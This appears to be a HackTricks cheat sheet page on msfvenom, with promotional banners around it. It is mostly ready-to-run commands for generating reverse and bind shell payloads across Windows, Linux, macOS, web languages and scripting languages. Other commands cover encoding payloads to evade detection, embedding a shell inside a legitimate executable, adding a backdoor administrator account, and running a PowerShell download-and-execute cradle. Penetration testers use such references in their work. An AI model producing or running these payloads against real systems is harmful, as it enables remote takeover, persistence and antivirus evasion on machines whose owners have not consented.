

<details>

<summary><strong><a href="https://www.twitch.tv/hacktricks_live/schedule">🎙️ HackTricks LIVE Twitch</a> Wednesdays 5.30pm (UTC) 🎙️ - <a href="https://www.youtube.com/@hacktricks_LIVE">🎥 Youtube 🎥</a></strong></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FfinO3sjcfKcruYYBafKC%2Fimage.png?alt=media&#x26;token=7bba2ebb-a679-4357-a859-bff2d9c5136a" alt=""><figcaption></figcaption></figure>

​Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\
This [**crypto bounty alone**](https://hackenproof.com/jungle/jungle-smart-contract) is worth $1.000.000!\
Check out the [**top-paying bounties**](https://hackenproof.com/programs) among crypto projects.\
[**Sign up on HackenProof**](https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA) to get rewarded without delays and become the web3 hacker legend.

{% embed url="https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA" %}




`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

One can also use the `-a` to specify the architecture or the `--platform`

# Listing

```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```

# Common params when creating a shellcode

```bash
-b "\x00\x0a\x0d" 
-f c 
-e x86/shikata_ga_nai -i 5 
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```

# **Windows**

## **Reverse Shell**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```

## Bind Shell

```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```

## Create User

```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```

## CMD Shell

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```

## **Execute Command**

```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```

## Encoder

```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```

## Embedded inside executable

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```

# Linux Payloads

## Reverse Shell

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```

## Bind Shell

```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```

## SunOS \(Solaris\)

```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```

# **MAC Payloads**

## **Reverse Shell:**

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```

## **Bind Shell**

```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```

# **Web Based Payloads**

## **PHP**

### Reverse shel**l**

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

## ASP/x

### Reverse shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```

## JSP

### Reverse shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```

## WAR

### Reverse Shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```

## NodeJS

```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```

# **Script Language payloads**

## **Perl**

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```

## **Python**

```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```

## **Bash**

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```


<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FfinO3sjcfKcruYYBafKC%2Fimage.png?alt=media&#x26;token=7bba2ebb-a679-4357-a859-bff2d9c5136a" alt=""><figcaption></figcaption></figure>

​Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\
This [**crypto bounty alone**](https://hackenproof.com/jungle/jungle-smart-contract) is worth $1.000.000!\
Check out the [**top-paying bounties**](https://hackenproof.com/programs) among crypto projects.\
[**Sign up on HackenProof**](https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA) to get rewarded without delays and become the web3 hacker legend.

{% embed url="https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA" %}


<details>

<summary><strong><a href="https://www.twitch.tv/hacktricks_live/schedule">🎙️ HackTricks LIVE Twitch</a> Wednesdays 5.30pm (UTC) 🎙️ - <a href="https://www.youtube.com/@hacktricks_LIVE">🎥 Youtube 🎥</a></strong></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


